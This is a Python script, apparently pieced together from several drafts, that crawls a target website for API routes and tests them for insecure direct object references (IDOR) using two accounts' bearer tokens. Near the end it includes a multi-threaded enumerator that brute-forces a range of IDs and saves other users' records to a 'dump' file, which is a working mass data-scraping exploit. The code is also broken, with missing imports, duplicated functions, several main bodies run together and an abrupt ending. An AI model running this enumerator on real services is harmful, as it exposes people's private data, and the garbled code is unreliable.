#!/usr/bin/env python3
"""
Project: Modular Python Script Template
Description: Just plug in your def functions and run!
"""

import argparse
import sys
from typing import Optional

# ==========================================
# 🧩 1. PLUG IN YOUR FUNCTIONS HERE (def)
# ==========================================


import re
import time
import json
from pathlib import Path
from typing import Set, List, Tuple
from urllib.parse import urlparse, urljoin, urldefrag
from urllib.request import Request, urlopen
from urllib.robotparser import RobotFileParser
from html.parser import HTMLParser
from collections import deque
from concurrent.futures import ThreadPoolExecutor
from typing import Set, List, Tuple, Dict
from pathlib import Path
from urllib.parse import urlparse, urljoin, urldefrag
from html.parser import HTMLParser
import re
import json
import hashlib
import time
import requests
import json
import time
import getpass

from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urljoin

from typing import List, Dict, Any, Optional
from urllib.parse import (
    urlparse,
    urljoin,
    urlsplit,
    urlunsplit,
    parse_qsl,
    urlencode
)

USER_AGENT = "AuthorizedSecurityResearchBot/1.0"

ROUTE_PATTERN = re.compile(
    r"""["'`](?P<route>/?(?:api|v\d+|users?|accounts?|orders?|profiles?|documents?|files?|customers?|members?|payments?|invoices?|projects?|tickets?|messages?|records?)(?:/[^"'`\s<>]*)?)["'`]""",
    re.IGNORECASE
)

HTTP_PATTERN = re.compile(
    r"""https?://[^\s"'`<>]+""",
    re.IGNORECASE
)


class PageParser(HTMLParser):
    """Extract links and JavaScript references from HTML."""

    def __init__(self) -> None:
        super().__init__()
        self.links: Set[str] = set()
        self.scripts: Set[str] = set()

    def handle_starttag(self, tag: str, attrs: list) -> None:
        attributes = dict(attrs)

        if tag == "a" and attributes.get("href"):
            self.links.add(attributes["href"])

        if tag == "script" and attributes.get("src"):
            self.scripts.add(attributes["src"])


def normalize_url(url: str) -> str:
    """Normalize URL and remove fragments."""

    return urldefrag(url.strip())[0]


def is_same_domain(url: str, hostname: str) -> bool:
    """Restrict discovery to the supplied hostname."""

    parsed = urlparse(url)

    return (
        parsed.scheme in ("http", "https")
        and parsed.hostname is not None
        and parsed.hostname.lower() == hostname.lower()
    )


def get_robots_parser(domain: str) -> RobotFileParser:
    """Read the target's robots.txt rules."""

    parser = RobotFileParser()
    parser.set_url(urljoin(domain, "/robots.txt"))

    try:
        parser.read()
    except Exception:
        parser.allow_all = True

    return parser


def fetch_public_resource(url: str) -> Tuple[str, str]:
    """Fetch a public page or static source with a timeout."""

    request = Request(
        url,
        headers={"User-Agent": USER_AGENT}
    )

    with urlopen(request, timeout=8) as response:
        content_type = response.headers.get("Content-Type", "").lower()

        if response.status != 200:
            return "", content_type

        data = response.read(2 * 1024 * 1024)

        text = data.decode("utf-8", errors="ignore")

        return text, content_type


def extract_source_endpoints(content: str, base_url: str) -> Set[str]:
    """Extract API route references from JavaScript or JSON."""

    candidates: Set[str] = set()

    candidates.update(ROUTE_PATTERN.findall(content))
    candidates.update(HTTP_PATTERN.findall(content))

    results: Set[str] = set()

    hostname = urlparse(base_url).hostname

    for candidate in candidates:
        candidate = candidate.strip()

        if not candidate:
            continue

        full_url = normalize_url(urljoin(base_url, candidate))

        if hostname and is_same_domain(full_url, hostname):
            results.add(full_url)

    return results


def extract_json_endpoints(
    content: str,
    base_url: str
) -> Set[str]:
    """Extract endpoint-like strings from JSON content."""

    endpoints: Set[str] = set()

    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return endpoints

    def walk(value: object) -> None:
        if isinstance(value, dict):
            for key, item in value.items():
                if isinstance(item, str):
                    if key.lower() in {
                        "url", "endpoint", "path", "route",
                        "api", "href", "uri"
                    }:
                        candidate = urljoin(base_url, item)

                        if is_same_domain(
                            candidate,
                            urlparse(base_url).hostname or ""
                        ):
                            endpoints.add(normalize_url(candidate))

                walk(item)

        elif isinstance(value, list):
            for item in value:
                walk(item)

    walk(data)
    return endpoints


def get_source_hash(content: str) -> str:
    """Generate a content hash to avoid duplicate processing."""

    return hashlib.sha256(
        content.encode("utf-8", errors="ignore")
    ).hexdigest()



def extract_json_endpoints(
    content: str,
    base_url: str
) -> Set[str]:
    """Extract endpoint-like strings from JSON content."""

    endpoints: Set[str] = set()

    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return endpoints

    def walk(value: object) -> None:
        if isinstance(value, dict):
            for key, item in value.items():
                if isinstance(item, str):
                    if key.lower() in {
                        "url", "endpoint", "path", "route",
                        "api", "href", "uri"
                    }:
                        candidate = urljoin(base_url, item)

                        if is_same_domain(
                            candidate,
                            urlparse(base_url).hostname or ""
                        ):
                            endpoints.add(normalize_url(candidate))

                walk(item)

        elif isinstance(value, list):
            for item in value:
                walk(item)

    walk(data)
    return endpoints


def get_source_hash(content: str) -> str:
    """Generate a content hash to avoid duplicate processing."""

    return hashlib.sha256(
        content.encode("utf-8", errors="ignore")
    ).hexdigest()


def automated_source_discovery(
    domain: str,
    max_pages: int = 30,
    max_sources: int = 100
) -> Tuple[List[str], int, int]:
    """
    Discover and analyze public HTML, JavaScript and JSON sources.

    Restricts access to the supplied hostname and respects robots.txt.
    Extracts endpoint references without requesting discovered API routes.
    """

    parsed = urlparse(domain)

    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
    ):
        raise ValueError("A valid HTTPS domain is required")

    hostname = parsed.hostname.lower()
    base_domain = f"https://{parsed.netloc}"

    source_dir = Path("sources")
    source_dir.mkdir(parents=True, exist_ok=True)

    robots = get_robots_parser(base_domain)

    # BFS queue for page discovery
    page_queue = deque([base_domain])

    visited_pages: Set[str] = set()
    visited_sources: Set[str] = set()
    processed_hashes: Set[str] = set()

    discovered_endpoints: Set[str] = set()

    pages_scanned = 0
    sources_scanned = 0

    print("\n========== SOURCE DISCOVERY ==========")

    def allowed(url: str) -> bool:
        """Check domain scope and robots rules."""

        return (
            is_same_domain(url, hostname)
            and robots.can_fetch(USER_AGENT, url)
        )

    def save_source(
        content: str,
        extension: str
    ) -> bool:
        """Save a unique source file."""

        content_hash = get_source_hash(content)

        if content_hash in processed_hashes:
            return False

        processed_hashes.add(content_hash)

        filename = (
            f"source_{len(processed_hashes)}{extension}"
        )

        (source_dir / filename).write_text(
            content,
            encoding="utf-8"
        )

        return True

    def process_source(
        source_url: str
    ) -> Set[str]:
        """Download and analyze one authorized static source."""

        nonlocal sources_scanned

        if source_url in visited_sources:
            return set()

        if not allowed(source_url):
            return set()

        visited_sources.add(source_url)

        try:
            content, content_type = fetch_public_resource(
                source_url
            )

            extension = Path(
                urlparse(source_url).path
            ).suffix.lower()

            if "javascript" in content_type or extension == ".js":
                extension = ".js"

                endpoints = extract_source_endpoints(
                    content,
                    source_url
                )

            elif (
                "json" in content_type
                or extension == ".json"
            ):
                extension = ".json"

                endpoints = extract_json_endpoints(
                    content,
                    source_url
                )

            else:
                return set()

            if not save_source(content, extension):
                print(f"[DUPLICATE] {source_url}")
                return set()

            sources_scanned += 1

            print(
                f"[SOURCE {sources_scanned}] "
                f"{source_url}"
            )

            print(
                f"[+] Extracted references: "
                f"{len(endpoints)}"
            )

            return endpoints

        except Exception as error:
            print(f"[!] Source skipped: {error}")
            return set()

    while page_queue and pages_scanned < max_pages:

        page_url = normalize_url(page_queue.popleft())

        if page_url in visited_pages:
            continue

        if not allowed(page_url):
            continue

        visited_pages.add(page_url)

        try:
            content, content_type = fetch_public_resource(
                page_url
            )

            if "html" not in content_type:
                continue

            pages_scanned += 1

            print(f"\n[PAGE {pages_scanned}] {page_url}")

            parser = PageParser()
            parser.feed(content)

            # Discover same-domain links using BFS
            for link in parser.links:

                next_url = normalize_url(
                    urljoin(page_url, link)
                )

                path = urlparse(next_url).path.lower()

                if (
                    allowed(next_url)
                    and next_url not in visited_pages
                    and next_url not in page_queue
                    and not path.endswith((
                        ".pdf", ".png", ".jpg",
                        ".jpeg", ".zip", ".svg"
                    ))
                ):
                    page_queue.append(next_url)

            # Extract references from inline HTML
            inline_endpoints = extract_source_endpoints(
                content,
                page_url
            )

            discovered_endpoints.update(
                inline_endpoints
            )

            print(
                f"[+] Inline references: "
                f"{len(inline_endpoints)}"
            )

            # Process external JS and JSON sources
            source_urls = {
                normalize_url(urljoin(page_url, script))
                for script in parser.scripts
            }

            # JSON links are discovered from explicit page links
            source_urls.update(
                normalize_url(urljoin(page_url, link))
                for link in parser.links
                if urlparse(link).path.lower().endswith(".json")
            )

            # Keep discovery scoped to the authorized hostname
            source_urls = {
                url for url in source_urls
                if allowed(url)
            }

            # Parallel source processing
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = executor.map(
                    process_source,
                    sorted(source_urls)
                )

                for endpoints in futures:
                    discovered_endpoints.update(endpoints)

            # Keep requests polite
            time.sleep(0.5)

        except Exception as error:
            print(
                f"[!] Page skipped: "
                f"{page_url} ({error})"
            )

    print("\n========== DISCOVERY COMPLETE ==========")
    print(f"[+] Pages scanned: {pages_scanned}")
    print(f"[+] Sources scanned: {sources_scanned}")
    print(f"[+] Unique references: {len(discovered_endpoints)}")

    return (
        sorted(discovered_endpoints),
        pages_scanned,
        sources_scanned
    )


from urllib.parse import (
    urlparse,
    urlsplit,
    urlunsplit,
    parse_qsl,
    urlencode
)
from typing import List, Dict
import re


def find_idor_endpoints(
    endpoints: List[str]
) -> List[Dict[str, str]]:
    """
    Find resource URLs containing potential object IDs.
    This function performs passive analysis only.
    """

    results: List[Dict[str, str]] = []

    resource_names = (
        r"users?|accounts?|orders?|profiles?|documents?|"
        r"files?|customers?|members?|payments?|invoices?|"
        r"projects?|tickets?|messages?|records?"
    )

    resource_pattern = re.compile(
        rf"/(?:{resource_names})(?:/|$)",
        re.IGNORECASE
    )

    path_id_pattern = re.compile(
        rf"(/(?:{resource_names})/)"
        r"(\d+|[0-9a-f]{24}|"
        r"[0-9a-f]{8}-[0-9a-f-]{27,})"
        r"(?=/|$)",
        re.IGNORECASE
    )

    id_pattern = re.compile(
        r"^(?:\d+|[0-9a-f]{24}|"
        r"[0-9a-f]{8}-[0-9a-f-]{27,})$",
        re.IGNORECASE
    )

    id_keys = {
        "id", "user_id", "account_id",
        "profile_id", "customer_id",
        "owner_id", "order_id", "record_id"
    }

    for endpoint in endpoints:

        parsed = urlsplit(endpoint)

        if not resource_pattern.search(parsed.path):
            continue

        new_path, path_count = path_id_pattern.subn(
            r"\1{user_id}",
            parsed.path
        )

        query = parse_qsl(
            parsed.query,
            keep_blank_values=True
        )

        new_query = []
        query_matched = False

        for key, value in query:

            if (
                key.lower() in id_keys
                and id_pattern.fullmatch(value)
            ):
                new_query.append((key, "{user_id}"))
                query_matched = True
            else:
                new_query.append((key, value))

        if path_count == 0 and not query_matched:
            continue

        encoded_query = urlencode(new_query)

        encoded_query = encoded_query.replace(
            "%7Buser_id%7D",
            "{user_id}"
        )

        template = urlunsplit((
            parsed.scheme,
            parsed.netloc,
            new_path,
            encoded_query,
            ""
        ))

        results.append({
            "endpoint": template,
            "severity": "MEDIUM",
            "reason": (
                "Potential object identifier detected. "
                "Authorization requires verification."
            )
        })

    return results


def save_results(
    results: List[Dict[str, str]],
    filename: str = "idor_results.txt"
) -> None:
    """Save identified IDOR candidate endpoints."""

    with open(filename, "w", encoding="utf-8") as file:

        if not results:
            file.write(
                "No candidate endpoints identified.\n"
            )

        for result in results:

            file.write(
                f"Endpoint: {result['endpoint']}\n"
                f"Severity: {result['severity']}\n"
                f"Reason: {result['reason']}\n"
                f"{'-' * 60}\n"
            )

    print(f"[+] Results saved: {filename}")
    print(f"[+] Saved candidates: {len(results)}")



# ==========================================
# ⚙️ 2. CORE EXECUTION ENGINE (Auto-Handles Flow)
# ==========================================

def parse_arguments() -> argparse.Namespace:
    """Command-line arguments manage kore."""
    parser = argparse.ArgumentParser(
        description="Modular Python Template - Just add functions."
    )
    # Ekhane tumi CLI arguments add korte paro jodi dorkar hoy
    parser.add_argument(
        "--name", 
        type=str, 
        default="Zaman", 
        help="Name parameter for function 1"
    )
    parser.add_argument(
        "--num", 
        type=int, 
        default=5, 
        help="Number parameter for function 2"
    )
    return parser.parse_args()


from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, urljoin


def validate_test_url(
    base_url: str,
    endpoint: str
) -> str:
    """Ensure requests stay within the authorized HTTPS host."""

    base = urlparse(base_url)

    url = urljoin(
        base_url.rstrip("/") + "/",
        endpoint.lstrip("/")
    )

    target = urlparse(url)

    if (
        base.scheme != "https"
        or target.scheme != "https"
        or target.hostname != base.hostname
        or (target.port or 443) != (base.port or 443)
        or target.username
        or target.password
    ):
        raise ValueError("Endpoint outside authorized HTTPS scope")

    return url


def extract_owner_ids(data: Any) -> List[str]:
    """Extract likely ownership identifiers from JSON responses."""

    owner_keys = {
        "user_id",
        "owner_id",
        "account_id",
        "profile_id"
    }

    found = []

    def walk(value: Any) -> None:
        if isinstance(value, dict):
            for key, item in value.items():
                if key.lower() in owner_keys and item is not None:
                    found.append(str(item))
                walk(item)

        elif isinstance(value, list):
            for item in value:
                walk(item)

    walk(data)

    return found


def make_test_request(
    url: str,
    token: str
) -> Dict[str, Any]:
    """Make a read-only authenticated GET request."""

    response = requests.get(
        url,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "Authorized-IDOR-Test/1.0"
        },
        timeout=10,
        allow_redirects=False
    )

    try:
        body = response.json()
    except ValueError:
        body = None

    return {
        "status": response.status_code,
        "body": body
    }


def multi_account_idor_test(
    base_url: str,
    endpoint_templates: List[str],
    account_a_id: str,
    account_b_id: str,
    account_a_token: str,
    account_b_token: str
) -> List[Dict[str, Any]]:
    """
    Compare two authorized test accounts against the same
    resource using read-only requests.

    Templates must contain {user_id}.
    """

    results: List[Dict[str, Any]] = []

    for template in endpoint_templates:

        try:
            endpoint_a = template.format(user_id=account_a_id)
            endpoint_b = template.format(user_id=account_b_id)

            url_a = validate_test_url(base_url, endpoint_a)
            url_b = validate_test_url(base_url, endpoint_b)

            # Account A accesses its own resource.
            own_a = make_test_request(url_a, account_a_token)

            # Account A attempts to access Account B's resource.
            cross_a = make_test_request(url_b, account_a_token)

            # Account B accesses its own resource (control).
            own_b = make_test_request(url_b, account_b_token)

            b_body = own_b["body"]
            cross_body = cross_a["body"]

            b_owner_found = (
                account_b_id in extract_owner_ids(b_body)
                if b_body is not None else False
            )

            same_response = (
                b_body is not None
                and cross_body is not None
                and json.dumps(
                    b_body, sort_keys=True
                ) == json.dumps(
                    cross_body, sort_keys=True
                )
            )

            suspected = (
                200 <= own_b["status"] < 300
                and 200 <= cross_a["status"] < 300
                and same_response
                and b_owner_found
            )

            results.append({
                "endpoint": template,
                "account_a_own_status": own_a["status"],
                "account_a_cross_status": cross_a["status"],
                "account_b_own_status": own_b["status"],
                "account_b_owner_verified": b_owner_found,
                "responses_match": same_response,
                "severity": (
                    "POTENTIAL_IDOR_REVIEW"
                    if suspected else "INCONCLUSIVE"
                ),
                "reason": (
                    "Account A received the same B-owned resource "
                    "as Account B. Manual authorization verification required."
                    if suspected else
                    "No conclusive cross-account access evidence."
                )
            })

            # Keep requests polite.
            time.sleep(0.5)

        except (ValueError, requests.RequestException, KeyError) as error:

            results.append({
                "endpoint": template,
                "severity": "ERROR",
                "reason": str(error)
            })

    return results


def save_authorization_results(
    results: List[Dict[str, Any]],
    filename: str = "multi_account_idor_results.json"
) -> None:
    """Save authorization test metadata without response bodies."""

    with open(filename, "w", encoding="utf-8") as file:
        json.dump(results, file, indent=4)

    print(f"[+] Authorization report saved: {filename}")





import requests
import json
import re
import time
import getpass

from typing import List, Dict, Any
from urllib.parse import urlparse


def load_idor_endpoints(
    filename: str = "idor_results.txt"
) -> List[str]:
    """Read approved endpoint templates from the discovery report."""

    endpoints: List[str] = []

    try:
        with open(filename, "r", encoding="utf-8") as file:
            for line in file:
                if line.startswith("Endpoint:"):
                    endpoint = line.split(":", 1)[1].strip()

                    if "{user_id}" in endpoint:
                        endpoints.append(endpoint)

    except FileNotFoundError:
        print(f"[!] File not found: {filename}")

    return list(dict.fromkeys(endpoints))


def validate_endpoint_scope(
    endpoint: str,
    base_url: str
) -> bool:
    """Ensure an endpoint belongs to the authorized HTTPS host."""

    base = urlparse(base_url)
    target = urlparse(endpoint)

    return (
        target.scheme == "https"
        and target.hostname == base.hostname
        and target.port == base.port
        and target.username is None
        and target.password is None
    )


def authorized_test_request(
    endpoint: str,
    token: str,
    timeout: int = 10
) -> Dict[str, Any]:
    """Send a read-only GET request using a test account."""

    response = requests.get(
        endpoint,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "User-Agent": "Authorized-IDOR-Validator/1.0"
        },
        timeout=timeout,
        allow_redirects=False
    )

    try:
        body_json = response.json()
    except ValueError:
        body_json = None

    content_length = response.headers.get("Content-Length")

    return {
        "status": response.status_code,
        "content_length": (
            int(content_length)
            if content_length and content_length.isdigit()
            else len(response.content)
        ),
        "body_text": response.text.strip(),
        "body_json": body_json
    }


def compare_account_responses(
    account_a_own: Dict[str, Any],
    account_b_own: Dict[str, Any],
    account_a_cross: Dict[str, Any]
) -> Dict[str, bool]:
    """
    Compare own-account and cross-account responses.

    Content-Length is supporting evidence only.
    Exact meaningful body comparison is required.
    """

    owner_body = normalize_response_body(account_b_own)
    cross_body = normalize_response_body(account_a_cross)
    account_a_body = normalize_response_body(account_a_own)

    owner_valid = is_meaningful_response(account_b_own)
    cross_valid = is_meaningful_response(account_a_cross)
    account_a_valid = is_meaningful_response(account_a_own)

    successful_status = (
        200 <= account_b_own["status"] < 300
        and 200 <= account_a_cross["status"] < 300
        and 200 <= account_a_own["status"] < 300
    )

    body_match = (
        owner_valid
        and cross_valid
        and owner_body == cross_body
    )

    own_responses_differ = (
        account_a_valid
        and owner_valid
        and account_a_body != owner_body
    )

    content_length_match = (
        account_b_own["content_length"]
        == account_a_cross["content_length"]
    )

    confirmed = (
        successful_status
        and body_match
        and own_responses_differ
    )

    return {
        "body_match": body_match,
        "content_length_match": content_length_match,
        "own_responses_differ": own_responses_differ,
        "confirmed": confirmed
    }

def validate_idor_candidates(
    endpoints: List[str],
    base_url: str,
    account_a_id: str,
    account_b_id: str,
    account_a_token: str,
    account_b_token: str
) -> List[Dict[str, Any]]:
    """
    Compare own-resource and cross-account responses
    for two authorized test accounts.
    """

    results: List[Dict[str, Any]] = []

    for template in endpoints:

        if template.count("{user_id}") != 1:
            continue

        try:
            endpoint_a = template.format(
                user_id=account_a_id
            )

            endpoint_b = template.format(
                user_id=account_b_id
            )

            url_a = validate_test_url(
                base_url,
                endpoint_a
            )

            url_b = validate_test_url(
                base_url,
                endpoint_b
            )

            # Account A accesses its own test resource.
            own_a = authorized_test_request(
                url_a,
                account_a_token
            )

            # Account B accesses its own test resource.
            own_b = authorized_test_request(
                url_b,
                account_b_token
            )

            # Account A requests the known Account B test resource.
            cross_a = authorized_test_request(
                url_b,
                account_a_token
            )

            comparison = compare_account_responses(
                account_a_own=own_a,
                account_b_own=own_b,
                account_a_cross=cross_a
            )

            confirmed = comparison["confirmed"]

            results.append({
                "endpoint_template": template,
                "account_a_own_status": own_a["status"],
                "account_b_own_status": own_b["status"],
                "account_a_cross_status": cross_a["status"],
                "account_b_content_length": own_b["content_length"],
                "cross_account_content_length": cross_a["content_length"],
                "body_match": comparison["body_match"],
                "content_length_match": comparison["content_length_match"],
                "own_responses_differ": comparison["own_responses_differ"],
                "severity": (
                    "HIGH / CONFIRMED"
                    if confirmed else "INCONCLUSIVE"
                ),
                "reason": (
                    "Cross-account response matches the meaningful "
                    "owner response, while the two own-account "
                    "responses differ."
                    if confirmed else
                    "The response comparison did not establish "
                    "cross-account access."
                )
            })

            time.sleep(0.5)

        except (
            ValueError,
            requests.RequestException,
            KeyError
        ) as error:

            results.append({
                "endpoint_template": template,
                "severity": "ERROR",
                "reason": str(error)
            })

    return results

def save_validation_report(
    results: List[Dict[str, Any]],
    filename: str = "idor_validation_report.json"
) -> None:
    """Save validation metadata without tokens or response bodies."""

    with open(filename, "w", encoding="utf-8") as file:
        json.dump(
            results,
            file,
            indent=4
        )

    print(f"[+] Validation report saved: {filename}")

def normalize_response_body(
    response: Dict[str, Any]
) -> str:
    """Create a consistent representation of a response body."""

    body_json = response.get("body_json")

    if body_json is not None:
        return json.dumps(
            body_json,
            sort_keys=True,
            separators=(",", ":")
        )

    return response.get("body_text", "").strip()


def is_meaningful_response(
    response: Dict[str, Any]
) -> bool:
    """Reject empty and generic authorization responses."""

    body = response.get("body_json")
    text = response.get("body_text", "").strip()

    if body is None:
        if not text:
            return False

        try:
            body = json.loads(text)
        except ValueError:
            body = None

    if body is None or body == {} or body == []:
        return False

    if isinstance(body, str):
        text = body.strip()

    if isinstance(body, dict) and not body:
        return False

    if isinstance(body, list) and not body:
        return False

    blocked_messages = {
        "unauthorized",
        "forbidden",
        "access denied",
        "not found",
        "null",
        "{}",
        "[]"
    }

    if text.lower() in blocked_messages:
        return False

    return True




# Logging configuration setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


def fetch_single_record(
    session: requests.Session, base_url: str, user_id: int, headers: dict
) -> Optional[Dict[str, Any]]:
    """Fetches data for a single ID endpoint (IDOR exploitation context)."""
    target_url = f"{base_url}/{user_id}"
    try:
        response = session.get(target_url, headers=headers, timeout=5)

        # Success condition check (adjust status code or response criteria as per target behavior)
        if response.status_code == 200:
            try:
                data = response.json()
                logger.info(f"Successfully scraped ID: {user_id}")
                return {"id": user_id, "data": data}
            except json.JSONDecodeError:
                logger.warning(
                    f"ID {user_id} returned 200 OK but invalid JSON format."
                )
                return None
        elif response.status_code == 404:
            logger.debug(f"ID {user_id}: Not Found (404)")
            return None
        else:
            logger.debug(
                f"ID {user_id}: Skipped due to status code {response.status_code}"
            )
            return None

    except requests.RequestException as e:
        logger.error(f"Request failed for ID {user_id}: {e}")
        return None


def enumerate_idor_data(
    base_url: str,
    headers: Dict[str, str],
    start_id: int,
    end_id: int,
    max_workers: int = 10,
) -> List[Dict[str, Any]]:
    """Performs multi-threaded mass data scraping across an ID range."""
    scraped_records: List[Dict[str, Any]] = []

    logger.info(
        f"Starting IDOR enumeration from ID {start_id} to {end_id} with {max_workers} threads..."
    )

    with requests.Session() as session:
        # Session-er default headers update koreneya
        session.headers.update(headers)

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=max_workers
        ) as executor:
            future_to_id = {
                executor.submit(
                    fetch_single_record, session, base_url, user_id, headers
                ): user_id
                for user_id in range(start_id, end_id + 1)
            }

            for future in concurrent.futures.as_completed(future_to_id):
                result = future.result()
                if result:
                    scraped_records.append(result)

    logger.info(
        f"Enumeration completed. Total records dumped: {len(scraped_records)}"
    )
    return scraped_records


def save_dumped_data(data: List[Dict[str, Any]], filename: str = "idor_dump.json") -> None:
    """Saves the scraped records into a JSON file."""
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        logger.info(f"Data successfully exported and saved to {filename}")
    except IOError as e:
        logger.error(f"Failed to save file {filename}: {e}")

def main() -> None:
    
    """Run interactive public source discovery and IDOR analysis."""

    print("\n========== DEEP IDOR CANDIDATE FINDER ==========\n")

    domain = input("[?] Enter authorized target domain: ").strip()

    if not domain:
        print("[!] Domain required.")
        return

    if "://" not in domain:
        domain = "https://" + domain

    parsed = urlparse(domain)

    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
    ):
        print("[!] Enter a valid HTTPS domain.")
        return

    domain = f"https://{parsed.netloc}"

    print(f"\n[+] Target: {domain}")

    try:
        endpoints, pages, sources = automated_source_discovery(
            domain=domain,
            max_pages=30,
            max_sources=100
        )

        print("\n========== DISCOVERY SUMMARY ==========")
        print(f"[+] Pages scanned: {pages}")
        print(f"[+] Sources scanned: {sources}")
        print(f"[+] Endpoints discovered: {len(endpoints)}")

        results = find_idor_endpoints(endpoints)

        save_results(results, "idor_results.txt")

        print("\n========== ANALYSIS SUMMARY ==========")
        print(f"[+] Analyzed endpoints: {len(results)}")
        print(
            f"[+] HIGH candidates: "
            f"{sum(r['severity'] == 'HIGH' for r in results)}"
        )
        print(
            f"[+] MEDIUM candidates: "
            f"{sum(r['severity'] == 'MEDIUM' for r in results)}"
        )
        print(
            f"[+] LOW candidates: "
            f"{sum(r['severity'] == 'LOW' for r in results)}"
        )

        print("\n[+] Sources saved: ./sources/")
        print("[+] Report saved: ./idor_results.txt")

    except Exception as error:
        print(f"\n[ERROR] {error}")


    """Run authorized multi-account IDOR testing."""

    print("\n========== MULTI-ACCOUNT IDOR TESTER ==========\n")

    base_url = input("[?] Authorized HTTPS target: ").strip()

    if not base_url.startswith("https://"):
        base_url = "https://" + base_url

    parsed = urlparse(base_url)

    if not parsed.hostname or parsed.username or parsed.password:
        print("[!] Invalid target URL.")
        return

    base_url = f"https://{parsed.netloc}"

    print("\n========== TEST ACCOUNT DETAILS ==========\n")

    account_a_id = input("[?] Account A user ID: ").strip()
    account_b_id = input("[?] Account B user ID: ").strip()

    if not account_a_id or not account_b_id:
        print("[!] Both account IDs are required.")
        return

    if account_a_id == account_b_id:
        print("[!] Account IDs must be different.")
        return

    account_a_token = getpass.getpass(
        "[?] Account A bearer token: "
    )

    account_b_token = getpass.getpass(
        "[?] Account B bearer token: "
    )

    if not account_a_token or not account_b_token:
        print("[!] Both tokens are required.")
        return

    print("\n========== ENDPOINT CONFIGURATION ==========\n")

    print("Use {user_id} as the resource ID placeholder.")
    print("Separate endpoints with semicolons.")
    print("Example: /api/user/profile?id={user_id}")

    raw_endpoints = input(
        "\n[?] Enter authorized endpoint templates: "
    ).strip()

    endpoint_templates = [
        item.strip()
        for item in raw_endpoints.split(";")
        if item.strip()
    ]

    if not endpoint_templates:
        print("[!] No endpoint templates supplied.")
        return

    print(f"\n[+] Configured endpoints: {len(endpoint_templates)}")

    print("\n========== AUTHORIZATION TEST ==========\n")

    results = multi_account_idor_test(
        base_url=base_url,
        endpoint_templates=endpoint_templates,
        account_a_id=account_a_id,
        account_b_id=account_b_id,
        account_a_token=account_a_token,
        account_b_token=account_b_token
    )

    for result in results:

        print(f"\nEndpoint: {result['endpoint']}")
        print(f"Result: {result['severity']}")
        print(f"Reason: {result['reason']}")

        if result["severity"] != "ERROR":
            print(
                "Account A own status:",
                result["account_a_own_status"]
            )
            print(
                "Account A cross status:",
                result["account_a_cross_status"]
            )
            print(
                "Account B own status:",
                result["account_b_own_status"]
            )

    save_authorization_results(results)

    print("\n========== TEST SUMMARY ==========\n")

    suspected = sum(
        r["severity"] == "POTENTIAL_IDOR_REVIEW"
        for r in results
    )

    errors = sum(
        r["severity"] == "ERROR"
        for r in results
    )

    print(f"[+] Total endpoints: {len(results)}")
    print(f"[+] Potential IDOR candidates: {suspected}")
    print(f"[+] Errors: {errors}")
    print("[+] Report: multi_account_idor_results.json")

    """Run automated validation using discovery results."""

    print("\n========== IDOR VALIDATOR ==========\n")

    base_url = input(
        "[?] Authorized HTTPS target: "
    ).strip()

    if not base_url.startswith("https://"):
        print("[!] HTTPS URL required.")
        return

    parsed = urlparse(base_url)

    if not parsed.hostname or parsed.username or parsed.password:
        print("[!] Invalid target.")
        return

    base_url = f"https://{parsed.netloc}"

    filename = input(
        "[?] Discovery file [idor_results.txt]: "
    ).strip() or "idor_results.txt"

    # Load endpoint templates.
    endpoints = load_idor_endpoints(filename)

    if not endpoints:
        print("[!] No approved endpoint templates found.")
        print("[!] Templates must contain {user_id}.")
        return

    print(f"[+] Loaded endpoints: {len(endpoints)}")

    # Account configuration.
    account_a_id = input("[?] Account A test ID: ").strip()
    account_b_id = input("[?] Account B test ID: ").strip()

    if not account_a_id or not account_b_id:
        print("[!] Both IDs are required.")
        return

    if account_a_id == account_b_id:
        print("[!] IDs must be different.")
        return

    account_a_token = getpass.getpass(
        "[?] Account A token: "
    )

    account_b_token = getpass.getpass(
        "[?] Account B token: "
    )

    if not account_a_token or not account_b_token:
        print("[!] Both tokens are required.")
        return

    print("\n========== VALIDATION STARTED ==========\n")

    results = validate_idor_candidates(
        endpoints=endpoints,
        base_url=base_url,
        account_a_id=account_a_id,
        account_b_id=account_b_id,
        account_a_token=account_a_token,
        account_b_token=account_b_token
    )

    for result in results:
        print(
            f"\nEndpoint: {result['endpoint_template']}"
        )
        print(f"Result: {result['result']}")

    save_validation_report(results)

    potential = sum(
        r["result"] == "POTENTIAL_IDOR"
        for r in results
    )

    print("\n========== VALIDATION SUMMARY ==========")
    print(f"[+] Tested: {len(results)}")
    print(f"[+] Potential IDOR: {potential}")
    print(f"[+] Report: idor_validation_report.json")

    """Run source discovery and passive IDOR candidate analysis."""

    print("\n========== DEEP IDOR CANDIDATE FINDER ==========\n")

    domain = input("[?] Enter authorized target domain: ").strip()

    if not domain:
        print("[!] Domain required.")
        return

    if "://" not in domain:
        domain = "https://" + domain

    parsed = urlparse(domain)

    if (
        parsed.scheme != "https"
        or not parsed.hostname
        or parsed.username
        or parsed.password
    ):
        print("[!] Enter a valid HTTPS domain.")
        return

    domain = f"https://{parsed.netloc}"

    try:
        # Step 1: Discover public sources.
        endpoints, pages, sources = automated_source_discovery(
            domain=domain,
            max_pages=30,
            max_sources=100
        )

        print("\n========== DISCOVERY SUMMARY ==========")
        print(f"[+] Pages scanned: {pages}")
        print(f"[+] Sources scanned: {sources}")
        print(f"[+] Raw endpoints: {len(endpoints)}")

        if not endpoints:
            print("[!] No endpoint references discovered.")
            return

        # Step 2: Passive candidate analysis.
        results = find_idor_endpoints(endpoints)

        print("\n========== CANDIDATE ANALYSIS ==========")
        print(f"[+] Raw endpoints: {len(endpoints)}")
        print(f"[+] IDOR candidates: {len(results)}")

        # Step 3: Save candidates.
        save_results(
            results,
            "idor_results.txt"
        )

        if results:
            print("\n[+] Sample candidates:")

            for result in results[:10]:
                print(f"    {result['endpoint']}")
        else:
